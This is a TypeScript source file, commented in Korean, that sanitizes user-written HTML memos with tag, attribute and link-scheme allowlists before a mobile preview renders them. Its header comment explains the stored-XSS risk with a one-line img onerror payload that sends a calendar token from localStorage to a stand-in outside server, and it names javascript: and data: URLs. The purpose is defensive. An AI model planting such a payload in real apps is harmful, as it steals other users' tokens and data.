/**
 * ── 남이 쓴 HTML을 화면에 놓기 전에 ──────────────────────────────────────────
 *
 * 업무 메모(`task.memo`)는 HTML 문자열로 저장되고, 폰의 미리보기가 그걸
 * `dangerouslySetInnerHTML`로 그대로 그리고 있었습니다. 메모는 **그 프로젝트의
 * 아무 멤버나** 쓸 수 있습니다 — 초대 링크로 들어온 외부 협업자를 포함해서.
 *
 * 그래서 이런 한 줄을 메모에 심어 두면
 *
 *     <img src=x onerror="fetch('https://남의서버/'+localStorage.gcal_token)">
 *
 * 그 업무를 연 사람의 브라우저에서 **그 사람 권한으로** 실행됩니다.
 * `<script>`는 innerHTML로는 안 돌지만 `onerror`·`onload`는 돕니다.
 * 그 사람이 볼 수 있는 모든 프로젝트, 데일리 노트, 그리고 localStorage에 있는
 * 드라이브·캘린더 토큰이 전부 그 코드의 손에 들어갑니다.
 *
 * **허락한 것만 남깁니다.** 막을 것을 세는 방식(블랙리스트)은 새 태그가
 * 생길 때마다 뚫립니다. 여기 적힌 것은 이 앱의 편집기가 실제로 내놓는
 * 것들뿐입니다 — StarterKit, 할 일 목록, 형광펜.
 */

/** 편집기가 만드는 것들. 여기 없는 태그는 껍질을 벗기고 글자만 남깁니다. */
const ALLOWED_TAGS = new Set([
  'p', 'br', 'hr', 'div', 'span',
  'strong', 'b', 'em', 'i', 'u', 's', 'strike', 'del', 'mark', 'code',
  'pre', 'blockquote',
  'ul', 'ol', 'li', 'label', 'input',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'a',
])

/**
 * 남길 속성.
 *
 * `on*`은 **하나도** 안 남깁니다 — 여기 이름을 세는 게 아니라, 목록에 없으면
 * 버리는 방식이라 `onerror`든 앞으로 생길 무엇이든 자동으로 빠집니다.
 * `style`도 뺍니다. 미리보기에서 가운데 정렬이 사라지는 값이면 싸게 치는
 * 편입니다.
 */
const ALLOWED_ATTRS = new Set(['class', 'href', 'title', 'type', 'checked', 'colspan', 'rowspan'])

/** 체크박스 줄이 살아 있으려면 필요한 것들. 값을 실행하지 않는 표시입니다. */
const ALLOWED_DATA_PREFIX = 'data-'

export function tagAllowed(tag: string): boolean {
  return ALLOWED_TAGS.has(tag.toLowerCase())
}

export function attrAllowed(name: string): boolean {
  const n = name.toLowerCase()
  // 이벤트 핸들러는 이름이 무엇이든 먼저 자릅니다. 아래 검사에 걸리게 두지
  // 않는 이유는, data- 같은 접두사 규칙이 언젠가 느슨해질 수 있어서입니다.
  if (n.startsWith('on')) return false
  if (n === 'style') return false
  if (n.startsWith(ALLOWED_DATA_PREFIX)) return true
  return ALLOWED_ATTRS.has(n)
}

/**
 * 링크 주소.
 *
 * `javascript:`는 누르는 순간 코드가 됩니다. 편집기의 링크 단추가 스킴처럼
 * 생긴 것은 무엇이든 그대로 넣고 있었으므로(`javascript:alert(1)`도),
 * 저장된 메모에 이미 들어 있을 수 있습니다. 읽는 쪽에서도 막습니다.
 *
 * `data:`도 뺍니다 — `data:text/html`이 같은 일을 합니다.
 */
export function safeHref(href: string): string | null {
  const value = href.trim()
  // 스킴이 없으면 상대 주소입니다. 그건 이 앱 안이라 안전합니다.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(value)) return value.startsWith('//') ? null : value
  return /^(https?|mailto):/i.test(value) ? value : null
}

/**
 * 껍질만 벗기고 글자는 남깁니다.
 *
 * 통째로 버리면 `<script>`가 아니라 `<font>` 같은 옛 태그 하나 때문에 메모가
 * 빈칸으로 보입니다. 사람이 쓴 글은 지우지 않는 편이 맞습니다.
 */
export function sanitizeHtml(html: string): string {
  if (!html) return ''
  const doc = new DOMParser().parseFromString(html, 'text/html')

  const walk = (node: Element) => {
    // 자식이 바뀌므로 미리 복사해 둡니다.
    for (const child of [...node.children]) walk(child)

    const tag = node.tagName.toLowerCase()
    if (!tagAllowed(tag)) {
      // 스크립트·스타일 안의 글자는 글이 아니라 코드입니다. 남기면 화면에
      // 코드가 그대로 찍힙니다.
      if (tag === 'script' || tag === 'style' || tag === 'iframe' || tag === 'object' || tag === 'embed') {
        node.remove()
      } else {
        node.replaceWith(...node.childNodes)
      }
      return
    }

    for (const attr of [...node.attributes]) {
      if (!attrAllowed(attr.name)) { node.removeAttribute(attr.name); continue }
      if (attr.name.toLowerCase() === 'href') {
        const safe = safeHref(attr.value)
        if (safe === null) node.removeAttribute('href'); else node.setAttribute('href', safe)
      }
    }
    // target은 위에서 이미 떨어졌습니다 — 미리보기의 링크는 같은 탭에서
    // 엽니다. 웹뷰에서는 새 탭이 조용히 안 열리기도 하고요.
    // 체크박스는 보여 주기만 합니다 — 미리보기에서 눌러 봐야 저장되지 않고,
    // 눌린 것처럼 보이는 게 더 나쁩니다.
    if (tag === 'input') node.setAttribute('disabled', '')
  }

  for (const child of [...doc.body.children]) walk(child)
  return doc.body.innerHTML
}
